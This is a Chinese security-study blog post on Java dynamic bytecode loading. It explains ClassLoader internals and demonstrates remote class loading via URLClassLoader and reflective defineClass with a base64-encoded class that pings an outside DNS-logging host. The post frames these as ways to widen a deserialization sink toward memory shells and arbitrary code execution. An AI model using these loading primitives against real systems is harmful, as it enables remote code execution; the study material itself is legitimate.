---
layout: mypost
title: "动态加载字节码技术"
categories: [Java安全]
---

## 前言

七七八八也学了不少链子，都是很固定🧷的套路`EntryClass-->gadget-->sink`，目前sink这个点还只是单一的命令执行，能力是十分有限的，例如现在有需要回显，注入内存shell等场景，单凭一个`Runtime.getRuntime().exec("xxx");`它是很难去做到的，而动态加载字节码技术就是来解决这个问题的，把sink能造成的危害无限扩大。

## 调试代码

会遇到一些新名词，例如`AppClassLoader`、`URLClassLoader`、`ClassLoader#defineClass`等等，写几个demo调试一下，看看这些新名词的真面目。

1.首先还是回到forname函数，它是动态类加载的一种实现方式。

写一个DNS类，如下-->

```java
import java.io.IOException;

public class DNS {
    static{
        try {
            Runtime.getRuntime().exec("ping 6y7d5.cxsys.spacestabs.top");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

写一个Loader类去加载它-->

```java
public class Loader {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("DNS");
    }
}
```

此时执行main函数后，命令被成功的执行，结果如下-->

![alt text](image-48.png)

在`Class<?> clazz = Class.forName("DNS");`处下断点调试，跟到forName函数里面它实际上是去继续调用了forName0函数

![alt text](image-109.png)

它四个参数：className只是一个字符串、true代表该类要初始化、剩下两个参数全和caller有关，它的具体信息如下-->

![alt text](image-110.png)

而`ClassLoader.getClassLoader(caller)`的返回值就是上图中框中的`Launcher$AppClassLoader`，它是`Launcher`类的一个内部类。现在将它提到函数外，用forname的另一个重载函数去加载DNS类，如下-->

```java
public class Loader {
    public static void main(String[] args) throws Exception {
        ClassLoader loader = Loader.class.getClassLoader();
        Class<?> clazz = Class.forName("DNS", true, loader);
    }
}
```

Tips：`Loader.class.getClassLoader();`的结果就是`Launcher$AppClassLoader`，AppClassLoader(应用程序类加载器)是面向用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。

说到底forname函数其中还是主要靠这个ClassLoader，类的加载主要靠的是ClassLoader，当然可以用forname去加载一个恶意类，但forname实在是被封装的太多了（封装的越多、功能越精确、漏洞利用的可能性反而会降低），真实情况下怎么可能被当作一个sink？接下来将demo写的更底层一点。

2.利用ClassLoader.loadClass()函数去加载DNS类，如下-->

```java
public class Loader {
    public static void main(String[] args) throws Exception {
        ClassLoader loader = Loader.class.getClassLoader();
        loader.loadClass("DNS");
    }
}
```

此时执行main函数后，命令没有被成功执行，证明用ClassLoader.loadClass()去加载一个类，它默认是不会去初始化这个类的，相当于`Class<?> clazz = Class.forName("DNS", false, loader);`，得显式地调用其构造
函数，初始化代码才能被执行，如下-->

```java
public class Loader {
    public static void main(String[] args) throws Exception {
        ClassLoader loader = Loader.class.getClassLoader();
        Class<?> dns = loader.loadClass("DNS");
        dns.newInstance();
    }
}
```

下断点调试一下，跟到loadClass函数，由于loader是`Launcher$AppClassLoader`，所以在经历了loadClass函数的初始化后，会进入到`Launcher$AppClassLoader.loadClass`函数，如下-->

![alt text](image-111.png)

而`Launcher$AppClassLoader.loadClass`最后还是去调用了它父类URLClassLoader的loadClass函数，如下-->

![alt text](image-112.png)

父类的内部类FactoryURLClassLoader有一个loadClass，父类并没有loadClass函数，所以会去URLClassLoader的父类SecureClassLoader去找loadClass函数，它同样没有，再去SecureClassLoader的父类ClassLoader去找，最终调用到了`ClassLoader.loadClass`函数，如下-->

![alt text](image-113.png)

而`ClassLoader.loadClass`函数的内部逻辑是双亲委派模型，上文提到的AppClassLoader就是双亲委派模型中的一种类加载器，同样的还有两种类加载器分别是：ExtensionClassLoader、BootstrapClassLoader。除了这三种类加载器之外，用户还可以加入自定义的类加载器来进行拓展，以满足自己的特殊需求。就比如说，可以对 Java 类的字节码（ .class 文件）进行加密，加载时再利用自定义的类加载器对其解密。类加载的工作过程如下-->

![alt text](image-114.png)

在双亲委派模型中，代码接下来会一层层的向上找，从AppClassLoader到ExtensionClassLoader到BootstrapClassLoader，检查是否加载过DNS类，由于是第一次肯定是没有被加载过的，然后在自上而下的尝试去加载类，由于在demo代码中，DNS类是自己实现的类所以会在AppClassLoader中去加载这个类，见下图-->

![alt text](image-115.png)

Tips：不是在AppClassLoader中去尝试加载的类吗？为何会在URLClassLoader中去尝试加载呢？因为APPClassLoader中没有findClass这个函数，而URLClassLoader是它的父类，所以便到了URLClassLoader的findClass函数，去发现类并尝试加载类。其实ExtensionClassLoader也是一样的，同样是走的URLClassLoader的findClass函数，只不过它的`Resource res = ucp.getResource(path, false);`这一行代码运行结果为null，AppClassLoader的运行结果不为null。

接着就是到URLClassLoader类的`defineClass(name, res);`函数中-->

![alt text](image-116.png)

而它的最后会调用一个重载的defineClass函数，也就是它父类的defineClass函数如下-->

![alt text](image-117.png)

而SecureClassLoader类又会调用到它父类ClassLoader的defineClass函数，如下-->

![alt text](image-118.png)

最终去调用了defineClass1函数，它是一个native的方法，整个调用栈如下-->

![alt text](image-119.png)

至此DNS类加载完成！

## 取其精华

调试loadClass函数的整个过程费了不少功夫，梳理一下其中的关系-->

![alt text](image-120.png)

其中精华就是关键的三个函数，loadClass函数、findClass函数、defineClass函数，上述demo已经用loadClass函数去加载了DNS类，除了它当然还可以用其他两个函数去加载类-->利用URLClassLoader加载远程class文件和利用ClassLoader#defineClass直接加载字节码。

## 利用URLClassLoader加载远程class文件

URLClassLoader的findClass函数不能直接调用，只能通过loadClass函数去加载，此时不仅仅是可以加载本地路径的类，还可以通过协议去远程加载类。

1.file 协议加载class文件，代码如下-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("file:///E:\\")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();
    }
}
```

2.HTTP 协议加载class文件，其中在E盘根目录用python起一个http服务即可，代码如下-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("http://localhost:8000/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();
    }
}
```

3.file+jar 协议，在原目录运行`jar -cvf DNS.jar DNS.class`，接着复制到E盘，书写一个Loader类去加载，代码如下-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("jar:file:///E:\\DNS.jar!/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();
    }
}
```

4.同样的HTTP + jar 协议，代码如下-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("jar:http://localhost:8000/DNS.jar!/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();
    }
}
```

以上的四个demo均可以触发DNS请求，如下-->

![alt text](image-48.png)

最好用的肯定是 Http 协议的加载，如果能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利
用远程加载的方式执行任意代码！

## 利用ClassLoader#defineClass直接加载字节码

看defineClass函数的参数，name为类名，b为字节码数组，off为偏移量，len为字节码数组的长度，详情🔎如下-->

![alt text](image-121.png)

ClassLoader是抽象类，没有办法实例化，所以只能用它的子类来实例化，这里用AppClassLoader来实例化。defineClass是private的，则只能反射调用。代码如下-->

```java
import java.lang.reflect.Method;
import java.util.Base64;

public class Loader {
    public static void main(String[] args) throws Exception {
        ClassLoader appClassLoader = Loader.class.getClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass",
                String.class,
                byte[].class,
                int.class,
                int.class
        );
        defineClass.setAccessible(true);
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKAoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB0BAApTb3VyY2VGaWxlAQAIRE5TLmphdmEMAAoACwcAIgwAIwAkAQAfcGluZyA2eTdkNS5jeHN5cy5zcGFjZXN0YWJzLnRvcAwAJQAmAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACcBAANETlMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAgABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAMADgAAAAwAAQAAAAUADwAQAAAACAARAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAYACQAJAAwABwANAAgAFgAKAA4AAAAMAAEADQAJABIAEwAAABQAAAAHAAJMBwAVCQABABYAAAACABc=");
        Class hello = (Class)defineClass.invoke(appClassLoader, "DNS", code, 0, code.length);
        hello.newInstance();
    }
}
```

Tips：其中code的数据可以用`cat DNS.class | base64`来生成。

成功触发DNS请求，如下-->

![alt text](image-48.png)

至此，动态加载字节码技术完毕！